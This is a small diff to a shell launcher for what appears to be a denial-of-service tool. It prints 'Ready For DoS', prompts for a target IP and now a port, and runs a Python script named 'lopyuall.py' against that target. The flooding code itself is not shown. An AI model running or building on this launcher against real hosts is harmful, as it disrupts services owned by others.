@@ -6,8 +6,6 @@ clear
 printf "\nReady For DoS"
 read -p $"Target IP: " ip
 
-run(){
-    python "lopyuall.py" -s $1 -p "80"
-}
-
-run $ip
+printf "Before filling the port, please check first"
+read -p $"Port     : " port
+python3 "lopyuall.py" -s $ip -p $port
